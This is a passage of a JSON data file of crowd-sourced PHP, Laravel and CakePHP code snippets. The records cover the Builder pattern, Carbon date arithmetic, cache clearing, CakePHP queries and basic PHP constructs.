/**      * The Director works with any builder instance that the client code passes      * to it. This way, the client code may alter the final type of the newly      * assembled product.      */     public function setBuilder(Builder $builder): void     {         $this->builder = $builder;     }      /**      * The Director can construct several product variations using the same      * building steps.      */     public function buildMinimalViableProduct(): void     {         $this->builder->producePartA();     }      public function buildFullFeaturedProduct(): void     {         $this->builder->producePartA();         $this->builder->producePartB();         $this->builder->producePartC();     } }  /**  * The client code creates a builder object, passes it to the director and then  * initiates the construction process. The end result is retrieved from the  * builder object.  */ function clientCode(Director $director) {     $builder = new ConcreteBuilder1();     $director->setBuilder($builder);      echo \"Standard basic product:\\n\";     $director->buildMinimalViableProduct();     $builder->getProduct()->listParts();      echo \"Standard full featured product:\\n\";     $director->buildFullFeaturedProduct();     $builder->getProduct()->listParts();      // Remember, the Builder pattern can be used without a Director class.     echo \"Custom product:\\n\";     $builder->producePartA();     $builder->producePartC();     $builder->getProduct()->listParts(); }  $director = new Director(); clientCode($director);\n",
    "reg_date": "2021-10-12T10:12:53.000Z"
  },
  {
    "id": 528,
    "keyword": null,
    "link": null,
    "title": " button back php",
    "description": "<button onclick=\"history.go(-1);\">Back </button> \n",
    "reg_date": "2021-10-12T10:12:53.000Z"
  },
  {
    "id": 529,
    "keyword": null,
    "link": null,
    "title": " buttons in php",
    "description": "class StargazerButton extends \\atk4\\ui\\Button {    public $model;   public $label;    function init() {     parent::init();      $this->add(new Button(['Stars', 'basic blue', 'icon'=>'star']));     $this->label = $this->add(new Label($model['stars'], ['basic blue left pointing']));      $this->on('click', function() {       $this->model['stars']++;       $this->model->save();       return $this->reload();     });   } }\n",
    "reg_date": "2021-10-12T10:12:53.000Z"
  },
  {
    "id": 530,
    "keyword": null,
    "link": null,
    "title": " cache clear in laravel",
    "description": "php artisan cache:clear php artisan route:clear php artisan config:clear  php artisan view:clear \n//laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n//Updated Dec 2020 //laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n/**[SAFE] Clears all cache with 1 line!**/  php artisan route:clear &&   php artisan view:clear &&  php artisan config:clear && php artisan cache:clear &&  php artisan clear-compiled\nphp artisan optimize:clear\nphp artisan cache:clear php artisan view:clear php artisan route:clear php artisan clear-compiled php artisan config:cache\n",
    "reg_date": "2021-10-12T10:12:54.000Z"
  },
  {
    "id": 531,
    "keyword": null,
    "link": null,
    "title": " cake tmp name",
    "description": "// two folder need in cakephp 2.* version tmp/cache/models tmp/cache/persistent\n",
    "reg_date": "2021-10-12T10:12:54.000Z"
  },
  {
    "id": 532,
    "keyword": null,
    "link": null,
    "title": " cakephp 2 savefield",
    "description": "$this->MemberLoginMethod->id = $id; $this->MemberLoginMethod->saveField('enabled',  !$enabled); \n$data = [     [         'title' => 'First post',         'published' => 1     ],     [         'title' => 'Second post',         'published' => 1     ], ];  $articles = $this->getTableLocator()->get('Articles'); $entities = $articles->newEntities($data); $result = $articles->saveMany($entities);\n",
    "reg_date": "2021-10-12T10:12:54.000Z"
  },
  {
    "id": 533,
    "keyword": null,
    "link": null,
    "title": " cakephp 2 with customize link",
    "description": "Router::url('/', true) . 'img/example.png' (cakephp 2)\n// In mysql you can order by specific field values, by using ORDER BY FIELD: SELECT * FROM city  WHERE id IN (10, 1, 2) ORDER BY FIELD(id, 10, 1, 2) DESC;  // output: // order: first those with id = 10, those with id = 1, those with id = 2 // Do in cake \t'order' => array( \t\t'FIELD(City.id, 10, 1, 2)', \t),  // or     'order' => array( \t\t'FIELD(City.id, 10, 1, 2) DESC', \t),   \necho $this->Html->link(__('<i class=\"fas fa-icons\"></i>'), array(   'plugin' => 'building',    'controller' => 'service_icons',    'action' => 'index',    '?building_post_id=' . $buildingPost['BuildingPost']['id']), array('class' => 'btn btn-info btn-xs', 'escape' => false, 'data-toggle'=>'tooltip', 'title' => __d('building', 'add_service_icon')));   // output // http://localhost/paragonasia-portal/admin/building/service_icons/index/?building_post_id=16\n//chnage the layout in Cakephp 4 with the layout file called ajax.php $this->viewBuilder()->setLayout('ajax');\n1. Add .htaccess <IfModule mod_rewrite.c> \tRewriteEngine on \tRewriteRule ^$ webroot/ [L] \tRewriteRule (.*) webroot/$1 [L] </IfModule>  2. Add Permission tmp, Vendor, Webroot - Window Set permisson - Linux Set chmod -R 777\nPrefix routing is just very difficult to understand \n// output, if you wanna get output same below array, you need to use name=\"Member[verify_code]\"  // name=\"Member[email]\"  in form  Array(     [Member] => Array   (       [verify_code] => 123466       [email] => huuvi168@gmail.com       [lang] => zho       [password] => 123       [confirm_password] => 123 ) )      // cake php form   <?=$this->Form->create('Member', array('role' => 'form')); ?>   <fieldset>   <?=$this->Form->input('lang', array('type' => 'hidden', 'value' => $lang, 'required'));?>    <div class=\"form-group\">   <input type=\"hidden\" name=\"Member[verify_code]\" value=\"<?= isset($verify_code) && !empty($verify_code) ? $verify_code : ''; ?>\" />   </div>    <div class=\"form-group\">   <input type=\"hidden\" name=\"Member[email]\" value=\"<?= isset($email) && !empty($email) ? $email : ''; ?>\" />   </div>    <div class=\"form-group\">   <?=$this->Form->input('password', array('class' => 'form-control', 'placeholder' => __d('frontend', 'new_password'), 'label' => '', 'required')); ?>   </div>   </fieldset>   <?=$this->Form->end(); ?>\n// ------------------------------------ // ------------ one OR -------------- // ------------------------------------ $conditions = array(     'OR' => array(         array( 'MemberRole.school_id' \t=> array()),         array( 'MemberRole.role_id' \t=> $role),     ); );  // ------------------------------------ // ------------ multiple OR -------------- // ------------------------------------  'OR' => array(    array(      'MemberRole.school_id' \t=> array(),      'MemberRole.role_id' \t=> $role,    ),    array(      'MemberRole.school_id' \t=> array(),      'MemberRole.role_id' \t=>  Environment::read('role.register'),    ),    array(      'MemberRole.school_id' \t=> $school_id,      'MemberRole.role_id' \t=> Environment::read('role.register'),    ),    array(      'MemberRole.school_id' \t=> $school_id,      'MemberRole.role_id' \t=> $role    )  )\n",
    "reg_date": "2021-10-12T10:12:54.000Z"
  },
  {
    "id": 534,
    "keyword": null,
    "link": null,
    "title": " cakephp 4 change layout view in a method",
    "description": "//chnage the layout in Cakephp 4 with the layout file called ajax.php $this->viewBuilder()->setLayout('ajax');\n",
    "reg_date": "2021-10-12T10:12:54.000Z"
  },
  {
    "id": 535,
    "keyword": null,
    "link": null,
    "title": " cakephp life cycle",
    "description": "// https://stackoverflow.com/questions/20525897/what-is-the-lifecycle-of-a-cakephp-request/20534204#20534204\n",
    "reg_date": "2021-10-12T10:12:54.000Z"
  },
  {
    "id": 536,
    "keyword": null,
    "link": null,
    "title": " cakephp pagination",
    "description": "// admin_index  $all_settings = array(   'contain' => array(     'CreditType' => array(       'CreditTypeLanguage' => array(         'conditions' => array(           'CreditTypeLanguage.alias' => $this->lang18, // 'zho', 'eng', 'chi'         ),       ),     ),   ),   'recursive' => 0, );  $this->Paginator->settings = $all_settings; $companyCredits = $this->paginate(); $this->set(compact('companyCredits'));\n",
    "reg_date": "2021-10-12T10:12:54.000Z"
  },
  {
    "id": 537,
    "keyword": null,
    "link": null,
    "title": " cakephp send mail bcc",
    "description": "// $to_emails = array( //\t'abc1@gmail.com', //\t'abc2@gmail.com', //\t'abc3@gmail.com', //);  public function send($to_emails, $subject, $template, $data){    try{      $email = new CakeEmail('gmail');       $email->template($template)         ->bcc($to_emails)        //->to($to_emails)\t\t        // ->cc($to_emails)        ->viewVars($data)        ->subject($subject);       $email->send();       return array(        'status' => true      );    } catch(SocketException $e) {      CakeLog::write($this->log_module,                      \"Send email to \\\"\" . (is_array($to_emails) ? implode(', ', $to_emails) : $to_emails) . \"\\\" with template \\\"\" .                      $template . \"\\\" Failed because \" . $e->getMessage());      return array(        'status' => false,        'message' => \"Send email to \\\"\" . (is_array($to_emails) ? implode(', ', $to_emails) : $to_emails) . \"\\\" with template \\\"\" .         $template . \"\\\" Failed because \"  . $e->getMessage(),        'error_message' => $e->getMessage(),      );    }  }\n",
    "reg_date": "2021-10-12T10:12:54.000Z"
  },
  {
    "id": 538,
    "keyword": null,
    "link": null,
    "title": " calcolo iva php",
    "description": "$prezzo = 12.21; $iva = 22; $qty = 1;  $prezzo_tot = $prezzo * $qty;  $iva_val = ($prezzo_tot * $iva)/100;  $totale = $prezzo_tot + $iva_val;  echo number_format($totale, 2, '.', '');\n",
    "reg_date": "2021-10-12T10:12:54.000Z"
  },
  {
    "id": 539,
    "keyword": null,
    "link": null,
    "title": " calcul age php datetime",
    "description": "function get_age( $date ) {      $age = date('Y') - $date;     if (date('md') < date('md', strtotime($date))) {         return $age - 1;     }     return $age;  } \n",
    "reg_date": "2021-10-12T10:12:54.000Z"
  },
  {
    "id": 540,
    "keyword": null,
    "link": null,
    "title": " calculate array length in php",
    "description": "<?php \t$arr = [\"one\", \"two\", \"three\", \"four\"]; \techo count($arr);   ?>\n// using count() we can get proper length of the array $names = array(\"Ankur\",\"Raj\",\"Ram\",\"Suresh\"); // pass array into count() as parameter it will return array length echo count($names);  // output : 4\n<?php   //use count($var) -> $a[0] = 1; $a[1] = 3; $a[2] = 5; var_dump(count($a));\n",
    "reg_date": "2021-10-12T10:12:54.000Z"
  },
  {
    "id": 541,
    "keyword": null,
    "link": null,
    "title": " calculate person age by birthdate php",
    "description": " public function getAge($date)     {                  $dob = new DateTime($date);                  $now = new DateTime();                   $difference = $now->diff($dob);                   $age = $difference->y;                   return  $age;     }\n",
    "reg_date": "2021-10-12T10:12:55.000Z"
  },
  {
    "id": 542,
    "keyword": null,
    "link": null,
    "title": " calculate time difference php",
    "description": "\tdate_default_timezone_set(\"Africa/Johannesburg\");     $now = new DateTime();     $future_date = new DateTime('2020-10-21 00:00:00');          $interval = $future_date->diff($now);          echo ($interval->format(\"%a\") * 24) + $interval->format(\"%h\"). \" hours\". $interval->format(\" %i minutes \");     print_r($now->format('Y-m-d H:i:s')); \n$time1 = new DateTime('09:00:59'); $time2 = new DateTime('09:01:00'); $interval = $time1->diff($time2); echo $interval->format('%s second(s)');  Result: 1 second(s)\nFirst, make those minutes into seconds:  4 min 35 sec = 275 seconds  11 min = 660 seconds  Your percentage of remaining time will be (275 / 660) * 100. The percentage of time left would be ((660 - 275) / 660) * 100. Of course, that's all in seconds. Don't know how you are receiving that time in php, but it might look like:  $maxTime = 660; $timeTaken = 275;  $percentage = ($timeTaken / $maxTime) * 100;  // To get percentage of time left $percentLeft = (($maxTime - $timeTaken) / $maxTime) * 100;\n",
    "reg_date": "2021-10-12T10:12:55.000Z"
  },
  {
    "id": 543,
    "keyword": null,
    "link": null,
    "title": " calculate total time from start and end datetime in php",
    "description": "date1 = new DateTime('2006-04-12T12:30:00'); $date2 = new DateTime('2006-04-14T11:30:00');  $diff = $date2->diff($date1);  $hours = $diff->h; $hours = $hours + ($diff->days*24);  echo $hours;\n",
    "reg_date": "2021-10-12T10:12:55.000Z"
  },
  {
    "id": 544,
    "keyword": null,
    "link": null,
    "title": " call controller function from another controller laravel",
    "description": "// Include the other controller in this controller use App\\Http\\Controllers\\TasksController;  // Instantiate other controller class in this controller's method $tasks_controller = new TasksController; // Use other controller's method in this controller's method $tasks_controller->postNotification($comment_content, $author); \n// Include the other controller in this controller use App\\Http\\Controllers\\TasksController;  // Instantiate other controller class in this controller's method $tasks_controller = new TasksController; // Use other controller's method in this controller's method $tasks_controller->postNotification($comment_content, $author);\nreturn \\App::call('bla\\bla\\ControllerName@functionName');\n",
    "reg_date": "2021-10-12T10:12:55.000Z"
  },
  {
    "id": 545,
    "keyword": null,
    "link": null,
    "title": " call javascript function from php",
    "description": "// The most basic method <?php echo '<script type=\"text/javascript\">',      'someJsFunc();', // Or Whatever      '</script>'; ?>    // However, if what you are trying to achieve requires more complexity, // You might be better off adding the V8JS module, see link below\n<?php  if(your condition){      echo \"<script> window.onload = function() {      yourJavascriptFunction(param1, param2);  }; </script>\"; ?> \n<script>   var phpadd= <?php echo add(1,2);?> //call the php add function   var phpmult= <?php echo mult(1,2);?> //call the php mult function   var phpdivide= <?php echo divide(1,2);?> //call the php divide function </script>\n<?php  if(your condition){      echo \"<script> window.onload = function() {      yourJavascriptFunction(param1, param2);  }; </script>\"; ?>\n",
    "reg_date": "2021-10-12T10:12:55.000Z"
  },
  {
    "id": 546,
    "keyword": null,
    "link": null,
    "title": " call metho din config laravel",
    "description": "// Change service config parameters at runtime  laravel  You can set config values dynamically at runtime with config() helper:  config(['services.mailgun' => $arrayWithNewSettings]);\n",
    "reg_date": "2021-10-12T10:12:55.000Z"
  },
  {
    "id": 547,
    "keyword": null,
    "link": null,
    "title": " call model function in controller laravel",
    "description": "$model = new Model; $model->func(); __________________________________   or  Model::func() // this function must be static to call it staticly ..  \n",
    "reg_date": "2021-10-12T10:12:55.000Z"
  },
  {
    "id": 548,
    "keyword": null,
    "link": null,
    "title": " call php function in js",
    "description": "// The most basic method <?php echo '<script type=\"text/javascript\">',      'someJsFunc();', // Or Whatever      '</script>'; ?>    // However, if what you are trying to achieve requires more complexity, // You might be better off adding the V8JS module, see link below\n<script>   var phpadd= <?php echo add(1,2);?> //call the php add function   var phpmult= <?php echo mult(1,2);?> //call the php mult function   var phpdivide= <?php echo divide(1,2);?> //call the php divide function </script>\n<?php  if(your condition){      echo \"<script> window.onload = function() {      yourJavascriptFunction(param1, param2);  }; </script>\"; ?>\n",
    "reg_date": "2021-10-12T10:12:55.000Z"
  },
  {
    "id": 549,
    "keyword": null,
    "link": null,
    "title": " call to undefined function mysql connect()",
    "description": "Try checking to see if the PHP MySQL extension module is being loaded:  <?php     phpinfo(); ?>  If it's not there, add the following to the php.ini file:  extension=php_mysql.dll  Save and Restart You Apache HTTP Server\nsudo apt install php-mysqli\nIn case, you are using PHP7 already, the formerly deprecated functions mysql_* were removed entirely, so you should update your code using the PDO-functions or mysqli_* functions instead.  If that's not possible, as a workaround, rubo77 created a small PHP include file, that recreates the old mysql_* functions with mysqli_*()-functions: https://github.com/rubo77/php-mysql-fix\n",
    "reg_date": "2021-10-12T10:12:55.000Z"
  },
  {
    "id": 550,
    "keyword": null,
    "link": null,
    "title": " can i get mac id of laptop with php",
    "description": "function getMacLinux() {   exec('netstat -ie', $result);    if(is_array($result)) {     $iface = array();     foreach($result as $key => $line) {       if($key > 0) {         $tmp = str_replace(\" \", \"\", substr($line, 0, 10));         if($tmp <> \"\") {           $macpos = strpos($line, \"HWaddr\");           if($macpos !== false) {             $iface[] = array('iface' => $tmp, 'mac' => strtolower(substr($line, $macpos+7, 17)));           }         }       }     }     return $iface[0]['mac'];   } else {     return \"notfound\";   } }\n",
    "reg_date": "2021-10-12T10:12:55.000Z"
  },
  {
    "id": 551,
    "keyword": null,
    "link": null,
    "title": " can we create linked list in php",
    "description": "<?php //node structure class Node { public $data; public $next; } class LinkedList { public $head; public function __construct(){ $this->head = null; }  //Add new element at the end of the list public function push_back($newElement) { $newNode = new Node(); $newNode->data = $newElement; $newNode->next = null; if($this->head == null) { $this->head = $newNode; } else { $temp = new Node(); $temp = $this->head; while($temp->next != null) { $temp = $temp->next; } $temp->next = $newNode; } } //display the content of the list public function PrintList() { $temp = new Node(); $temp = $this->head; if($temp != null) { echo &ldquo;\\nThe list contains: &ldquo;; while($temp != null) { echo $temp->data.&rdquo; &ldquo;; $temp = $temp->next; } } else { echo &ldquo;\\nThe list is empty.&rdquo;; } } }; // test the code $MyList = new LinkedList(); //Add three elements at the end of the list. $MyList->push_back(10); $MyList->push_back(20); $MyList->push_back(30); $MyList->PrintList(); //The output of the above code will be: //The list contains: 10 20 30 ?>\n",
    "reg_date": "2021-10-12T10:12:55.000Z"
  },
  {
    "id": 552,
    "keyword": null,
    "link": null,
    "title": " cannot get all value from the contain cakephp",
    "description": "// on each model MUST HAVE THIS ROW for containable the model \tpublic $actsAs = array('Containable');  Ex: <?php App::uses('BuildingAppModel', 'Building.Model'); /**  * CreditType Model  *  * @property CompanyCredit $CompanyCredit  * @property CreditTypeLanguage $CreditTypeLanguage  */ class CreditType extends BuildingAppModel {  \tpublic $actsAs = array('Containable'); ///   ... }  ?>  // First: need to check model for the relationship is it correct? // next: MUST ADD THIS ROW for show all contain  'BuildingFacility' => array(   'fields' => array(     'BuildingFacility.id',\t\t// MUST ADD THIS ROW for show all contain   ),   'BuildingFacilityLanguage' => array(     'conditions' => array(       'BuildingFacilityLanguage.alias' => $this->lang18,     ),   ),   'BuildingPost' => array(     'fields' => array(       'BuildingPost.*',     ),     'BuildingPostLanguage' => array(       'conditions' => array(         'BuildingPostLanguage.alias' => $this->lang18,       ),     ),   ), ),\n",
    "reg_date": "2021-10-12T10:12:56.000Z"
  },
  {
    "id": 553,
    "keyword": null,
    "link": null,
    "title": " cannot use font awesome in php mvc",
    "description": "<link href=\"https://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css\" rel=\"stylesheet\"> \n",
    "reg_date": "2021-10-12T10:12:56.000Z"
  },
  {
    "id": 554,
    "keyword": null,
    "link": null,
    "title": " cannot use object of type stdclass as array",
    "description": "$obj_user = json_decode($user, true);  use json_decode($obj, true); \t// add true\n",
    "reg_date": "2021-10-12T10:12:56.000Z"
  },
  {
    "id": 555,
    "keyword": null,
    "link": null,
    "title": " carbon add few hours",
    "description": "Carbon::now('UTC')->addHour($hours)->format('Y-m-d H:i:s')\n",
    "reg_date": "2021-10-12T10:12:56.000Z"
  },
  {
    "id": 556,
    "keyword": null,
    "link": null,
    "title": " carbon add minutes",
    "description": "Carbon::now()->addMinutes($minutes)->timestamp;\nCarbon::createFromFormat('Y-m-d H:i:s', $request->date)->format('d-m-Y')\n$comment->created_at->diffForHumans();\nTry to parse() it first: $date = Carbon::parse($dateTime)             ->addSeconds($seconds)             ->format('Y-m-d H:i:s');\n<?php  namespace App\\Http\\Controllers;  use Illuminate\\Http\\Request;use Carbon\\Carbon;  class SignaturePadController extends Controller{    /**     * Write code on Method     *     * @return response()     */    public function index()    {        $currentDateTime = Carbon::now();        $newDateTime = Carbon::now()->addMinutes(5);                     print_r($currentDateTime);        print_r($newDateTime);    }}\n$now = Carbon::now(); echo $now;                               // 2020-03-22 17:45:58 echo \"\\n\"; $today = Carbon::today(); echo $today;                             // 2020-03-22 00:00:00 echo \"\\n\"; $tomorrow = Carbon::tomorrow('Europe/London'); echo $tomorrow;                          // 2020-03-23 00:00:00 echo \"\\n\"; $yesterday = Carbon::yesterday(); echo $yesterday;                         // 2020-03-21 00:00:00\n",
    "reg_date": "2021-10-12T10:12:56.000Z"
  },
  {
    "id": 557,
    "keyword": null,
    "link": null,
    "title": " carbon date from format",
    "description": "use Carbon/Carbon Carbon::now()->format('Y-m-d H:i:s');\nCarbon::createFromFormat('Y-m-d H:i:s', $request->date)->format('d-m-Y')\n1. First parse the created_at field as Carbon object. \t$createdAt = Carbon::parse($item['created_at']);  2.Then you can use \t$suborder['payment_date'] = $createdAt->format('M d Y');\nuse Carbon/Carbon Carbon::now()->format('Y-m-d H:i:s jS F Y'); // 2021-06-21 19:24:37 21st June 2021\n",
    "reg_date": "2021-10-12T10:12:56.000Z"
  },
  {
    "id": 558,
    "keyword": null,
    "link": null,
    "title": " carbon datetime test online",
    "description": "Carbon::createFromFormat('Y-m-d H:i:s', $request->date)->format('d-m-Y')\n$now = Carbon::now(); echo $now;                               // 2020-03-22 17:45:58 echo \"\\n\"; $today = Carbon::today(); echo $today;                             // 2020-03-22 00:00:00 echo \"\\n\"; $tomorrow = Carbon::tomorrow('Europe/London'); echo $tomorrow;                          // 2020-03-23 00:00:00 echo \"\\n\"; $yesterday = Carbon::yesterday(); echo $yesterday;                         // 2020-03-21 00:00:00\nCarbon::now()\n$fecha=Carbon::parse(\"06:00:00\"):\n$date = '08/20/2026 12:10 PM'; Carbon::parse($date)->format('Y-m-d H:m:s'));\n$date=0;\n",
    "reg_date": "2021-10-12T10:12:56.000Z"
  },
  {
    "id": 559,
    "keyword": null,
    "link": null,
    "title": " carbon diff",
    "description": "use Carbon/Carbon Carbon::now()->format('Y-m-d H:i:s');\n<?php use Carbon\\Carbon;\n$dt  =Carbon::now();  echo $dt->subDay();                      // 2012-03-03 00:00:00 echo $dt->subDays(29); \n$dt->diffInMinutes($dt->copy()->addSeconds(59));  $dtOttawa->diffInHours($dtVancouver); \n1. First parse the created_at field as Carbon object. \t$createdAt = Carbon::parse($item['created_at']);  2.Then you can use \t$suborder['payment_date'] = $createdAt->format('M d Y');\n$now = Carbon::now(); echo $now;                               // 2020-03-22 17:45:58 echo \"\\n\"; $today = Carbon::today(); echo $today;                             // 2020-03-22 00:00:00 echo \"\\n\"; $tomorrow = Carbon::tomorrow('Europe/London'); echo $tomorrow;                          // 2020-03-23 00:00:00 echo \"\\n\"; $yesterday = Carbon::yesterday(); echo $yesterday;                         // 2020-03-21 00:00:00\n",
    "reg_date": "2021-10-12T10:12:56.000Z"
  },
  {
    "id": 560,
    "keyword": null,
    "link": null,
    "title": " carbon diffforhumans",
    "description": "\\Carbon\\Carbon::parse('2019-08-03')->diffForHumans();\n$comment->created_at->diffForHumans();\n$now = Carbon::now(); echo $now;                               // 2020-03-22 17:45:58 echo \"\\n\"; $today = Carbon::today(); echo $today;                             // 2020-03-22 00:00:00 echo \"\\n\"; $tomorrow = Carbon::tomorrow('Europe/London'); echo $tomorrow;                          // 2020-03-23 00:00:00 echo \"\\n\"; $yesterday = Carbon::yesterday(); echo $yesterday;                         // 2020-03-21 00:00:00\nCarbon\\Carbon::parse('2019-08-03')->diffForHumans();\n",
    "reg_date": "2021-10-12T10:12:56.000Z"
  },
  {
    "id": 561,
    "keyword": null,
    "link": null,
    "title": " carbon format date in laravel",
    "description": "use Carbon/Carbon Carbon::now()->format('Y-m-d H:i:s');\nCarbon::createFromFormat('Y-m-d H:i:s', $request->date)->format('d-m-Y')\n1. First parse the created_at field as Carbon object. \t$createdAt = Carbon::parse($item['created_at']);  2.Then you can use \t$suborder['payment_date'] = $createdAt->format('M d Y');\n$now = Carbon::now(); echo $now;                               // 2020-03-22 17:45:58 echo \"\\n\"; $today = Carbon::today(); echo $today;                             // 2020-03-22 00:00:00 echo \"\\n\"; $tomorrow = Carbon::tomorrow('Europe/London'); echo $tomorrow;                          // 2020-03-23 00:00:00 echo \"\\n\"; $yesterday = Carbon::yesterday(); echo $yesterday;                         // 2020-03-21 00:00:00\n",
    "reg_date": "2021-10-12T10:12:56.000Z"
  },
  {
    "id": 562,
    "keyword": null,
    "link": null,
    "title": " carbon get today's month",
    "description": "use Carbon\\Carbon; // Date = 7th of July 2021 $month = Carbon::now()->format('M'); // July $month = Carbon::now()->format('m'); // 07 $month = Carbon::now()->month; // 7\nuse Carbon\\Carbon;  // if today is January 22, 2021 Carbon::now()->format('M'); // \"Jan\" Carbon::now()->format('m'); // \"01\" Carbon::now()->month; // 1 \nCarbon::tomorrow()->format('l'); \n",
    "reg_date": "2021-10-12T10:12:57.000Z"
  },
  {
    "id": 563,
    "keyword": null,
    "link": null,
    "title": " carbon laravel use",
    "description": "Carbon::createFromFormat('Y-m-d H:i:s', $request->date)->format('d-m-Y')\n<?php use Carbon\\Carbon;\n$now = Carbon::now(); echo $now;                               // 2020-03-22 17:45:58 echo \"\\n\"; $today = Carbon::today(); echo $today;                             // 2020-03-22 00:00:00 echo \"\\n\"; $tomorrow = Carbon::tomorrow('Europe/London'); echo $tomorrow;                          // 2020-03-23 00:00:00 echo \"\\n\"; $yesterday = Carbon::yesterday(); echo $yesterday;                         // 2020-03-21 00:00:00\n",
    "reg_date": "2021-10-12T10:12:57.000Z"
  },
  {
    "id": 564,
    "keyword": null,
    "link": null,
    "title": " carbon last day of month in timestamp",
    "description": "// first day of month (2021-01-01 00:00:00) Carbon::now()->firstOfMonth()->startOfDay()   // first day of month in timestamp (1609459200) Carbon::now()->firstOfMonth()->startOfDay()->timestamp   // last day of month (2021-01-31 23:59:59) Carbon::now()->lastOfMonth()->endOfDay()   // last day of month in timestamp (1640995199) Carbon::now()->lastOfMonth()->endOfDay()->timestamp\n",
    "reg_date": "2021-10-12T10:12:57.000Z"
  },
  {
    "id": 565,
    "keyword": null,
    "link": null,
    "title": " carbon months between dates",
    "description": "$to = \\Carbon\\Carbon::createFromFormat('Y-m-d H:s:i', '2015-5-5 3:30:34'); $from = \\Carbon\\Carbon::createFromFormat('Y-m-d H:s:i', '2016-6-6 9:30:34'); $diff_in_months = $to->diffInMonths($from); print_r($diff_in_months); // Output: 1\n",
    "reg_date": "2021-10-12T10:12:57.000Z"
  },
  {
    "id": 566,
    "keyword": null,
    "link": null,
    "title": " carbon now",
    "description": "Carbon::createFromFormat('Y-m-d H:i:s', $request->date)->format('d-m-Y')\n$comment->created_at->diffForHumans();\n$now = Carbon::now(); echo $now;                               // 2020-03-22 17:45:58 echo \"\\n\"; $today = Carbon::today(); echo $today;                             // 2020-03-22 00:00:00 echo \"\\n\"; $tomorrow = Carbon::tomorrow('Europe/London'); echo $tomorrow;                          // 2020-03-23 00:00:00 echo \"\\n\"; $yesterday = Carbon::yesterday(); echo $yesterday;                         // 2020-03-21 00:00:00\nCarbon::now();\n",
    "reg_date": "2021-10-12T10:12:57.000Z"
  },
  {
    "id": 567,
    "keyword": null,
    "link": null,
    "title": " carbon now format",
    "description": "use Carbon/Carbon Carbon::now()->format('Y-m-d H:i:s');\nCarbon::createFromFormat('Y-m-d H:i:s', $request->date)->format('d-m-Y')\n Carbon::now()->timestamp\n1. First parse the created_at field as Carbon object. \t$createdAt = Carbon::parse($item['created_at']);  2.Then you can use \t$suborder['payment_date'] = $createdAt->format('M d Y');\n$now = Carbon::now(); echo $now;                               // 2020-03-22 17:45:58 echo \"\\n\"; $today = Carbon::today(); echo $today;                             // 2020-03-22 00:00:00 echo \"\\n\"; $tomorrow = Carbon::tomorrow('Europe/London'); echo $tomorrow;                          // 2020-03-23 00:00:00 echo \"\\n\"; $yesterday = Carbon::yesterday(); echo $yesterday;                         // 2020-03-21 00:00:00\n",
    "reg_date": "2021-10-12T10:12:57.000Z"
  },
  {
    "id": 568,
    "keyword": null,
    "link": null,
    "title": " carbon now set timezone",
    "description": "Carbon::now('UTC')  //or  now('UTC') \nin the AppServiceProvider.php you can add the php functionality to alter the timestamp for the whole project  public function boot() {     Schema::defaultStringLength(191);     date_default_timezone_set('Asia/Aden'); }\nCarbon::now('UTC') \n",
    "reg_date": "2021-10-12T10:12:57.000Z"
  },
  {
    "id": 569,
    "keyword": null,
    "link": null,
    "title": " carbon start of day",
    "description": "// start of day in date (2021-01-01 00:00:00) Carbon::now()->startOfDay()   // start of day in timestamp (1609459200) Carbon::now()->startOfDay()->timestamp   // end of day in date (2021-01-01 23:59:59) Carbon::now()->endOfDay()   // end of day in timestamp (1609545599) Carbon::now()->endOfDay()->timestamp\n",
    "reg_date": "2021-10-12T10:12:57.000Z"
  },
  {
    "id": 570,
    "keyword": null,
    "link": null,
    "title": " carbon subdays",
    "description": "$users = Users::where('status_id', 'active')            ->where( 'created_at', '>', Carbon::now()->subDays(30))            ->get(); \n",
    "reg_date": "2021-10-12T10:12:57.000Z"
  },
  {
    "id": 571,
    "keyword": null,
    "link": null,
    "title": " carbon subtract two dates",
    "description": "$date = Carbon::parse('2016-09-17 11:00:00'); $now = Carbon::now();  $diff = $date->diffInDays($now);\n",
    "reg_date": "2021-10-12T10:12:57.000Z"
  },
  {
    "id": 572,
    "keyword": null,
    "link": null,
    "title": " carbon time ago laravel",
    "description": "$comment->created_at->diffForHumans();\n",
    "reg_date": "2021-10-12T10:12:57.000Z"
  },
  {
    "id": 573,
    "keyword": null,
    "link": null,
    "title": " carbon two day ago",
    "description": "$dt  =Carbon::now();  echo $dt->subDay();                      // 2012-03-03 00:00:00 echo $dt->subDays(29); \n",
    "reg_date": "2021-10-12T10:12:57.000Z"
  },
  {
    "id": 574,
    "keyword": null,
    "link": null,
    "title": " cart icon in woocommerce",
    "description": "<?php echo do_shortcode(\"[woo_cart_but]\"); ?>\n",
    "reg_date": "2021-10-12T10:12:58.000Z"
  },
  {
    "id": 575,
    "keyword": null,
    "link": null,
    "title": " cascade in laravel migration",
    "description": "$table->dropForeign('answers_user_id_foreign'); $table->foreign('user_id') ->references('id')->on('users') ->onDelete('cascade'); \nSchema::create('posts', function (Blueprint $table) {     $table->increments('id');     $table->integer('author')->unsigned();     $table->timestamps();     $table->foreign('author')->references('id')->on('users')->onUpdate('cascade'); }); \nSchema::create('posts', function (Blueprint $table) {     $table->id();     $table->foreignId('author')->constrained('users')->onDelete('cascade')->onUpdate('cascade');     $table->timestamps(); }); \n",
    "reg_date": "2021-10-12T10:12:58.000Z"
  },
  {
    "id": 576,
    "keyword": null,
    "link": null,
    "title": " case statement in php",
    "description": "switch (fruit) {   case apple:     code to be executed if fruit=apple;     break;   case banana:     code to be executed if fruit=banana;     break;     ...   default:     code to be executed if fruit is different from all fruits; }\nswitch ($i) {     case 0:         echo \"i ist gleich 0\";         break;     case 1:         echo \"i ist gleich 1\";         break;     case 2:         echo \"i ist gleich 2\";         break; }\n <?php switch ($i) {     case \"apple\":         echo \"i is apple\";         break;     case \"bar\":         echo \"i is bar\";         break;     case \"cake\":         echo \"i is cake\";         break; } ?>  \n<?php switch ($i) {     case \"apple\":         echo \"i is apple\";         break;     case \"bar\":         echo \"i is bar\";         break;     case \"cake\":         echo \"i is cake\";         break; } ?>\n",
    "reg_date": "2021-10-12T10:12:58.000Z"
  },
  {
    "id": 577,
    "keyword": null,
    "link": null,
    "title": " cast array to object php",
    "description": "$object = (object) $array;\n$object = json_decode(json_encode($array), FALSE); \n$arrayResult = array_map(function($array){     return (object)$array; }, $yourOrinalArray);\n",
    "reg_date": "2021-10-12T10:12:58.000Z"
  },
  {
    "id": 578,
    "keyword": null,
    "link": null,
    "title": " cast string to int php",
